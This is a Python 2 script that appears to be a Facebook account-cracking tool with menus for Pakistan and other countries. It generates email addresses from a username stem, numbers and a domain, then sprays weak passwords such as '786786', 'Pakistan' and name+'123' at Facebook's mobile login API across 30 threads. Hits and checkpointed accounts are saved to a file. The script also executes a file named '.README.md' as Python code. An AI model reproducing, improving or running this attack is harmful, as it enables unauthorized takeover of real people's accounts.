#!/usr/bin/python2
#coding=utf-8


import os,sys,time,random,threading,json
os.system("rm -rf .txt")
for n in range(1,1000):

    sys.stdout = open(".txt", "a")

    print(n)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 init.py')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')

def exb():
	print "[!] Exit"
	os.sys.exit()

def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### LOGO #####
logo='''
 __  __   ___    ____   ____     ___    _   _
|  \/  | |_ _|  / ___| |  _ \   / _ \  | \ | |
| |\/| |  | |  | |     | |_) | | | | | |  \| |
| |  | |  | |  | |___  |  _ <  | |_| | | |\  |
|_|  |_| |___|  \____| |_| \_\  \___/  |_| \_|
                           
--------------------------------------------------
➣ Auther   : MICRON

➣ GitHub   : https://github.com/shadowmicron

➣ YouTube  : ANONY MICRON

--------------------------------------------------
                                '''

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r[●] Loging In "+o),;sys.stdout.flush();time.sleep(1)


back = 0
successful = []
cpb = []
oks = []
id = []


def menu():
	os.system('clear')
	print logo
	print "[1] Pakistan Crack Menu"
	print "[2] Other Countries Crack Menu"
	print "[3] Follow Me On Facebook"
	print "[4] Log Out"
	print "[0] Exit            "
	print 50*"-"
	action()


def action():
	chb = raw_input("\n  ▄︻̷̿┻̿═━一   ")
	if chb =="":
		print "[!] Fill in correctly"
		action()
	elif chb =="1":
		crack_action()
	elif chb =="2":
	    crack_action2()
	elif chb =="3":
	    os.system("xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl")
	    time.sleep(1)
	    menu()
	elif chb =="4":
	    os.system("rm -rf ....")
	    print
	    psb(" Logout successfully")
	elif chb =="0":
		exb()
	else:
		print "[!] Fill in correctly"
		action()


def crack_action():
	bch = ""
	if bch =="":
		os.system('clear')
		print logo
		try:
			idlist = (".txt")
			kn=raw_input(" 1st Name Without Space : ")
			k=raw_input(" Username Without Digits : ")
			c=raw_input(" Mail Domain : ")
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '[!] Error 404, please try again'
			raw_input('\n[ Press Enter To Go Back ]')
			menu()
	elif bch =="0":
		menu()
	else:
		print "[!] Fill in correctly"
		crack_action()
	xxx = str(len(id))
	psb ('[✓] Please wait, process is running ...')
	time.sleep(0.5)
	psb ('[!] To Stop Process Press CTRL Then Press z')
	time.sleep(0.5)
	print 50*"-"
	print
	
			
	def main(arg):
		global cpb,oks
		user = k+arg+c
		try:
			pass1="786786"
			data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			q = json.loads(data.text)
			if '407' in q['error_msg']:
				print '\x1b[1;92m[Add--Email]\x1b[0m ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if '405' in q["error_msg"]:
					print '[Checkpoint] ' + user + ' | ' + pass1
					cps = open("save/checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
					pass2 = kn+'12345'
					data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
					q = json.loads(data.text)
					if '407' in q['error_msg']:
						print '\x1b[1;92m[Add--Email]\x1b[0m ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if '405' in q["error_msg"]:
							print '[Checkpoint] ' + user + ' | ' + pass2
							cps = open("save/checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
							pass3 = kn + '123'
							data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
							q = json.loads(data.text)
							if '407' in q['error_msg']:
								print '\x1b[1;92m[Add--Email]\x1b[0m ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if '405' in q["error_msg"]:
									print '[Checkpoint] ' + user + ' | ' + pass3
									cps = open("save/checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
									pass4 = 'Pakistan'
									data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
									q = json.loads(data.text)
									if '407' in q['error_msg']:
										print '\x1b[1;92m[Add--Email]\x1b[0m ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if '405' in q["error_msg"]:
											print '[Checkpoint] ' + user + ' | ' + pass4
											cps = open("save/checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*"-"
	print '[✓] Process Has Been Completed ....'
	print "[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb))
	print("[✓] CP File Has Been Saved : checkpoint.txt")
	raw_input("\n[Press Enter To Go Back]")
	os.system('python2 .README.md')
		
		
def crack_action2():
	bch = ""
	if bch =="":
		os.system('clear')
		print logo
		try:
			idlist = (".txt")
			kn=raw_input(" First Name : ")
			k=raw_input(" Username WIthout Digits : ")
			ac=raw_input(" Mail Domain : ")
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '[!] Error 404, please try again'
			raw_input('\n[ Press Enter To Go Back ]')
			menu()
	elif bch =="0":
		menu()
	else:
		print "[!] Fill in correctly"
		crack_action()
	xxx = str(len(id))
	psb ('[✓] Please wait, process is running ...')
	time.sleep(0.5)
	psb ('[!] To Stop Process Press CTRL Then Press z')
	time.sleep(0.5)
	print 50*"-"
	print
	
			
	def main(arg):
		global cpb,oks
		user = k+arg+ac
		try:
			pass1=kn+"123"
			data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
			q = json.loads(data.text)
			if '407' in q['error_msg']:
				print '\x1b[1;92m[Add--Email]\x1b[0m ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if '405' in q["error_msg"]:
					print '[Checkpoint] ' + user + ' | ' + pass1
					cps = open("save/checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
				else:
					pass2 = kn+'12345'
					data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
					q = json.loads(data.text)
					if '407' in q['error_msg']:
						print '\x1b[1;92m[Add--Email]\x1b[0m ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if '405' in q["error_msg"]:
							print '[Checkpoint] ' + user + ' | ' + pass2
							cps = open("save/checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
						else:
							pass3 = kn + "1234"
							data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
							q = json.loads(data.text)
							if '407' in q['error_msg']:
								print '\x1b[1;92m[Add--Email]\x1b[0m ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if '405' in q["error_msg"]:
									print '[Checkpoint] ' + user + ' | ' + pass3
									cps = open("save/checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
								else:
									pass4 = kn+"12"
									data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
									q = json.loads(data.text)
									if '407' in q['error_msg']:
										print '\x1b[1;92m[Add--Email]\x1b[0m ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if '405' in q["error_msg"]:
											print '[Checkpoint] ' + user + ' | ' + pass4
											cps = open("save/checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*"-"
	print '[✓] Process Has Been Completed ....'
	print "[✓] Total OK/CP : "+str(len(oks))+"/"+str(len(cpb))
	print("[✓] CP File Has Been Saved : checkpoint.txt")
	raw_input("\n[Press Enter To Go Back]")
	os.system('python2 .README.md')

if __name__ == '__main__':
	menu()
